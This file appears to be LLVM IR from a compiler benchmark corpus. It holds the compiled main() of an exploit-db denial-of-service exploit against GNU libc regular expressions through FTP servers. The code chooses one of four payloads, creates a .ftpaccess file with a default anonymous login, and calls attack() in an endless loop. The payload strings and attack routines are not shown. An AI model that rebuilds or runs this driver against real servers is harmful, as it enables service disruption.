; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_35061.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_35061.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.logindef = private unnamed_addr constant [10 x i8] c"anonymous\00", align 1
@__const.main.passdef = private unnamed_addr constant [13 x i8] c"cx@127.0.0.1\00", align 1
@.str = private unnamed_addr constant [64 x i8] c"This is exploit for ERE (GNU libc)\0Aby Maksymilian Arciemowicz\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"Try create .ftpaccess with %s\0A\0A\00", align 1
@expl0 = common dso_local global i8* null, align 8
@expl1 = common dso_local global i8* null, align 8
@expl2 = common dso_local global i8* null, align 8
@expl3 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [10 x i8], align 1
  %10 = alloca [13 x i8], align 1
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %8, align 8
  %13 = bitcast [10 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([10 x i8], [10 x i8]* @__const.main.logindef, i32 0, i32 0), i64 10, i1 false)
  %14 = bitcast [13 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %14, i8* align 1 getelementptr inbounds ([13 x i8], [13 x i8]* @__const.main.passdef, i32 0, i32 0), i64 13, i1 false)
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %16, 3
  br i1 %17, label %18, label %20

18:                                               ; preds = %2
  %19 = call i32 (...) @usage()
  br label %20

20:                                               ; preds = %18, %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  store i8* %23, i8** %11, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  store i8* %26, i8** %12, align 8
  %27 = load i32, i32* %4, align 4
  %28 = icmp sle i32 4, %27
  br i1 %28, label %29, label %33

29:                                               ; preds = %20
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 3
  %32 = load i8*, i8** %31, align 8
  store i8* %32, i8** %6, align 8
  br label %35

33:                                               ; preds = %20
  %34 = getelementptr inbounds [10 x i8], [10 x i8]* %9, i64 0, i64 0
  store i8* %34, i8** %6, align 8
  br label %35

35:                                               ; preds = %33, %29
  %36 = load i32, i32* %4, align 4
  %37 = icmp sle i32 5, %36
  br i1 %37, label %38, label %42

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 4
  %41 = load i8*, i8** %40, align 8
  store i8* %41, i8** %7, align 8
  br label %44

42:                                               ; preds = %35
  %43 = getelementptr inbounds [13 x i8], [13 x i8]* %10, i64 0, i64 0
  store i8* %43, i8** %7, align 8
  br label %44

44:                                               ; preds = %42, %38
  %45 = load i32, i32* %4, align 4
  %46 = icmp sle i32 6, %45
  br i1 %46, label %47, label %51

47:                                               ; preds = %44
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 5
  %50 = load i8*, i8** %49, align 8
  store i8* %50, i8** %8, align 8
  br label %51

51:                                               ; preds = %47, %44
  %52 = load i32, i32* %4, align 4
  %53 = icmp sle i32 7, %52
  br i1 %53, label %54, label %102

54:                                               ; preds = %51
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 6
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  switch i32 %58, label %99 [
    i32 1, label %59
    i32 2, label %69
    i32 3, label %79
    i32 4, label %89
  ]

59:                                               ; preds = %54
  %60 = load i8*, i8** @expl0, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i8* %60)
  %62 = load i8*, i8** %11, align 8
  %63 = load i8*, i8** %12, align 8
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %7, align 8
  %66 = load i8*, i8** %8, align 8
  %67 = load i8*, i8** @expl0, align 8
  %68 = call i32 @createexpl(i8* %62, i8* %63, i8* %64, i8* %65, i8* %66, i8* %67)
  br label %101

69:                                               ; preds = %54
  %70 = load i8*, i8** @expl1, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i8* %70)
  %72 = load i8*, i8** %11, align 8
  %73 = load i8*, i8** %12, align 8
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %7, align 8
  %76 = load i8*, i8** %8, align 8
  %77 = load i8*, i8** @expl1, align 8
  %78 = call i32 @createexpl(i8* %72, i8* %73, i8* %74, i8* %75, i8* %76, i8* %77)
  br label %101

79:                                               ; preds = %54
  %80 = load i8*, i8** @expl2, align 8
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i8* %80)
  %82 = load i8*, i8** %11, align 8
  %83 = load i8*, i8** %12, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = load i8*, i8** %7, align 8
  %86 = load i8*, i8** %8, align 8
  %87 = load i8*, i8** @expl2, align 8
  %88 = call i32 @createexpl(i8* %82, i8* %83, i8* %84, i8* %85, i8* %86, i8* %87)
  br label %101

89:                                               ; preds = %54
  %90 = load i8*, i8** @expl3, align 8
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i8* %90)
  %92 = load i8*, i8** %11, align 8
  %93 = load i8*, i8** %12, align 8
  %94 = load i8*, i8** %6, align 8
  %95 = load i8*, i8** %7, align 8
  %96 = load i8*, i8** %8, align 8
  %97 = load i8*, i8** @expl3, align 8
  %98 = call i32 @createexpl(i8* %92, i8* %93, i8* %94, i8* %95, i8* %96, i8* %97)
  br label %101

99:                                               ; preds = %54
  %100 = call i32 (...) @usage()
  br label %101

101:                                              ; preds = %99, %89, %79, %69, %59
  br label %102

102:                                              ; preds = %101, %51
  br label %103

103:                                              ; preds = %102, %103
  %104 = load i8*, i8** %11, align 8
  %105 = load i8*, i8** %12, align 8
  %106 = load i8*, i8** %6, align 8
  %107 = load i8*, i8** %7, align 8
  %108 = call i32 @attack(i8* %104, i8* %105, i8* %106, i8* %107)
  br label %103
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @usage(...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @createexpl(i8*, i8*, i8*, i8*, i8*, i8*) #2

declare dso_local i32 @attack(i8*, i8*, i8*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
